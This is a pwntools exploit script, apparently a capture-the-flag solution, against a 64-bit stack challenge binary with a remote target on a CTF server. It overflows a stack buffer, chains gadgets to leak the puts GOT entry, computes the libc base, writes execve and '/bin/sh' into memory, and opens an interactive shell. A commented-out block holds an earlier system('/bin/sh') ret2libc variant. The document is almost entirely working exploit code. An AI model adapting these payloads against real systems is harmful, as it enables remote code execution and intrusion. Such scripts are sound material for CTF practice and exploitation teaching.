#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level2.1-stack_x64"
elf=ELF(pwn_file)
libc=elf.libc #ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",23002)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

r.recvline()

loop_addr = 0x4006E0
pre_addr  = 0x4006Fa
func_addr = 0x400687

payload = 'a'*0x28 + p64(pre_addr) + p64(0)+p64(1)+p64(elf.got['puts']) + p64(0)+p64(0)+p64(elf.got['puts']) +p64(loop_addr) +'a'*56 +p64(func_addr)

r.sendline(payload)

puts_addr = u64(r.recvline()[:-1].ljust(8,'\x00'))
libc.address = puts_addr - libc.sym['puts']
debug()
sh_addr =list(libc.search("/bin/sh"))[0]

payload3 = 'a'*0x28 + p64(pre_addr) + p64(0)+p64(1)+p64(elf.got['gets']) + p64(0)+p64(0)+p64(0x601000) +p64(loop_addr) +'a'*56 +p64(func_addr) 

r.sendline(payload3)

r.sendline(p64(libc.sym['execve']) + "/bin/sh\x00")

payload2 = 'a'*0x28 + p64(pre_addr) + p64(0)+p64(1) +p64(0x601000) + p64(0) + p64(0) + p64(0x601008) + p64(loop_addr)

r.sendline(payload2)

r.interactive()

'''
ret_pos  = 0x40063E
ebp_pos  = elf.got[""] +0x20
call_puts_addr = 0x40067D  

payload = 'a'*0x20  + p64(ebp_pos) + p64(call_puts_addr)
r.sendline(payload)

#payload2 ='' #'a'*0x28 + p64(call_puts_addr)
#r.sendline(payload2)

#r.sendline('')

puts_pos = u64(r.recv()[:8])
print hex(puts_pos)

libc.address = puts_pos - libc.sym['puts']

sh_addr =list(libc.search("/bin/sh"))[0]
payload3  = 'a'*0x28 + p64(libc.sym['system']) + p64(0) + p64(sh_addr)
r.send(payload3)

r.interactive()
'''
